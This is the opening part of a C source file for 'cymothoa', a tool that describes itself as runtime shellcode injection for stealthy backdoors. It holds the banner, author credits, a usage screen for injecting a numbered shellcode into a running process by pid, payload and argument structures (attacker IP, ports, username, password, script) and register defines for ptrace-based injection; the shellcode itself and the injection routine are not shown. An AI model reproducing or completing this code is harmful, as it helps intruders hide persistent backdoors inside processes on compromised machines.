#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <signal.h>
#include <sys/ptrace.h>
#include <sys/user.h>
#include <unistd.h>
#include <stdint.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <fcntl.h>


char banner[] =
"                              _                 \n\
                          _  | |                \n\
  ____ _   _ ____   ___ _| |_| |__   ___  _____ \n\
 / ___) | | |    \\ / _ (_   _)  _ \\ / _ \\(____ |\n\
( (___| |_| | | | | |_| || |_| | | | |_| / ___ |\n\
 \\____)\\__  |_|_|_|\\___/  \\__)_| |_|\\___/\\_____|\n\
      (____/  ";

char info[] = "Ver.1 (beta) - Runtime shellcode injection, for stealthy backdoors...\n\n"
              "By codwizard (codwizard@gmail.com) and crossbower (crossbower@gmail.com)\n"
              "from ES-Malaria by ElectronicSouls (http://www.0x4553.org).";

char gretz[] = "Gretz: brigante, emgent, scox, keeley, fiocinino...\n"
               "       ...and backtrack-italy community ;)";

char usage_text[] = "\nUsage:\n"
                    "\tcymothoa -p <pid> -s <shellcode_number> [options]\n\n"
                    "Main options:\n"
                    "\t-p\tprocess pid\n"
                    "\t-s\tshellcode number\n"
                    "\t-l\tmemory region name for shellcode injection (default ld.*.so)\n"
                    "\t  \tsearch for \"r-xp\" permissions, see /proc/pid/maps...\n"
                    "\t-m\tmemory region name for persistent memory (default ld.*.so)\n"
                    "\t  \tsearch for \"rw-p\" permissions, see /proc/pid/maps...\n"
                    "\t-h\tprint this help screen\n"
                    "\t-S\tlist available shellcodes\n\n"
                    "Injection options (overwrite payload flags):\n"
                    "\t-f\tfork parent process\n"
                    "\t-F\tdon't fork parent process\n"
                    "\t-b\tcreate payload thread (probably you need also -F)\n"
                    "\t-B\tdon't create payload thread\n"
                    "\t-w\tpass persistent memory address\n"
                    "\t-W\tdon't pass persistent memory address\n"
                    "\t-a\tuse alarm scheduler\n"
                    "\t-A\tdon't use alarm scheduler\n"
                    "\t-t\tuse setitimer scheduler\n"
                    "\t-T\tdon't use setitimer scheduler\n\n"
                    "Payload arguments:\n"
                    "\t-j\tset timer (seconds)\n"
                    "\t-k\tset timer (microseconds)\n"
                    "\t-x\tset the IP\n"
                    "\t-y\tset the port number\n"
                    "\t-r\tset the port number 2\n"
                    "\t-z\tset the username (4 bytes)\n"
                    "\t-o\tset the password (8 bytes)\n"
                    "\t-c\tset the script code (ex: \"#!/bin/sh\\nls; exit 0\")\n"
                    "\t  \tescape codes will not be interpreted...\n";


// memory permissions
#define MEM_EXEC 0
#define MEM_WRITE 1

// payload structure
struct payload {
    char *description;
    size_t len;
    char *shellcode;
    int  options;
};

// payload flags
#define OPT_NEED_FORK 1
#define OPT_NEED_PERSISTENT 2
#define OPT_NEED_ALARM 4
#define OPT_NEED_SETITIMER 8
#define OPT_USE_SETITIMER 16
#define OPT_NEED_THREAD 32

// arguments structure
struct arguments {

    // standard arguments
    pid_t pid;            // process pid
    int payload_index;    // the selected payload
    char *lib_name;       // library region where to put the shellcode
    char *lib_name_mem;   // memory region for persistent memory

    // payload arguments
    uint32_t timer_sec;   // timer seconds
    uint32_t timer_micro; // timer microseconds
    uint32_t my_ip;       // our ip address
    uint16_t my_port;     // our port number
    uint16_t my_port2;    // our port number 2
    char *my_username;    // our username
    char *my_password;    // our password
    char *my_script;      // script code

    // payload flags from cmd-line
    int fork:1;
    int no_fork:1;
    int thread:1;
    int no_thread:1;
    int persistent:1;
    int no_persistent:1;
    int alarm:1;
    int no_alarm:1;
    int setitimer:1;
    int no_setitimer:1;

    // actions
    int show_help:1;     // show the help/usage screen
    int show_payloads:1; // show the list of payloads

} args;

// payload stuff...
char *sh_buffer = NULL;

int main_shellcode_len;
int payload_len;

int payload_count;

int need_fork;
int need_thread;
int need_persistent;
int need_alarm;
int need_setitimer;

int use_setitimer;

uint32_t persistent_addr;

#include "payloads.h"

#include "personalization.h"

// ARCHITECTURAL DEFINES

// 32 bit
#ifdef __i386__

// stack push size
#define BLOCK_SIZE 4

// registers
#define AX eax
#define BX ebx
#define INST_POINTER  eip
#define STACK_POINTER esp

#endif

// 64 bit
#ifdef __x86_64__

// stack push size
#define BLOCK_SIZE 8

// registers
#define AX rax
#define BX rbx
#define INST_POINTER  rip
#define STACK_POINTER rsp

#endif

